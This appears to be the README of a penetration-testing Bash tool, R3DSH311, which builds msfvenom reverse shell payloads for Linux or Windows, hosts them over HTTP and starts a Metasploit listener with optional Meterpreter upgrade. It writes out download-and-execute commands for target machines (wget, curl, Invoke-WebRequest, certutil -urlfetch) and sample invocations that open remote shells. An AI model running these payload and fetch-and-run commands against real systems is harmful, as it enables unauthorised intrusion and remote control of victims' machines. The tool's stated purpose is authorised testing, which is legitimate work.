# R3DSH311

R3DSH311 is a Bash script that automates the creation and hosting of reverse shell payloads using `msfvenom` and sets up a Metasploit listener using `terminator`. It supports both Linux and Windows platforms.

## Requirements

- **Operating System**: Linux (tested on Kali Linux)
- **Tools**:
  - `msfvenom` (part of Metasploit Framework)
  - `metasploit-framework` (for the listener)
  - `terminator` (terminal emulator)
  - `python3` (for hosting payloads via HTTP server)
- **Permissions**: Script must be executable (`chmod +x R3DSH311.sh`)
- **Network**: 
  - Attacker machine must have a reachable IP address (`LHOST`)
  - Port (`LPORT`) must be open and not blocked by firewall

## Usage

Run the script with the required `LHOST` and `LPORT` arguments, and optional flags to customize the payload and listener behavior.

```bash
./R3DSH311.sh LHOST LPORT [-m|--to-meterpreter] [-np|--no-payload] [-p|--platform linux|windows] [-o|--filename FILENAME]
```

### Arguments and Options

- `LHOST`: Local host IP address for the reverse shell connection (required)
- `LPORT`: Local port for the reverse shell connection (required)
- `-m` or `--to-meterpreter`: Upgrade the shell to Meterpreter session
- `-np` or `--no-payload`: Skip payload generation and hosting (only set up listener)
- `-p` or `--platform`: Specify target platform (`linux` or `windows`, default: `linux`)
- `-o` or `--filename`: Specify output filename (default: `rev.elf` for Linux, `rev.exe` for Windows)

### Payload Download and Execution

The script hosts the generated payload at `http://<LHOST>:80/<filename>` using Python's HTTP server. Below are examples for downloading and executing the payload on target machines.

#### Linux Target

1. **Using `wget`**:
   ```bash
   wget http://<LHOST>/<filename> -O payload
   chmod +x payload
   ./payload
   ```

2. **Using `curl`**:
   ```bash
   curl http://<LHOST>/<filename> -o payload
   chmod +x payload
   ./payload
   ```

#### Windows Target

1. **Using PowerShell (`Invoke-WebRequest`)**:
   ```powershell
   Invoke-WebRequest -Uri http://<LHOST>/<filename> -OutFile payload.exe
   Start-Process .\payload.exe
   ```

2. **Using `certutil`**:
   ```cmd
   certutil -urlfetch -f http://<LHOST>/<filename> payload.exe
   payload.exe
   ```

## Examples

1. **Generate and host a Linux payload, set up a basic reverse shell listener**:
   ```bash
   ./R3DSH311.sh 192.168.200.128 8888
   ```
   - Creates `/tmp/redshell/rev.elf`
   - Hosts at `http://192.168.200.128:80/rev.elf`
   - Sets up listener on `192.168.200.128:8888`

2. **Generate a Windows payload with custom filename, upgrade to Meterpreter**:
   ```bash
   ./R3DSH311.sh 192.168.200.128 4444 -p windows -o shell.exe -m
   ```
   - Creates `/tmp/redshell/shell.exe`
   - Hosts at `http://192.168.200.128:80/shell.exe`
   - Sets up listener with Meterpreter upgrade

3. **Set up listener only (no payload generation)**:
   ```bash
   ./R3DSH311.sh 192.168.200.128 9999 -np
   ```
   - Skips payload creation and hosting
   - Sets up listener on `192.168.200.128:9999`

## Notes

- Ensure `LHOST` is reachable from the target machine.
- The script creates a temporary directory `/tmp/redshell` for payloads and listener configuration.
- Use responsibly and only on systems you have permission to test.
- The listener runs in a `terminator` tab with `ExitOnSession` set to `false`, allowing multiple sessions.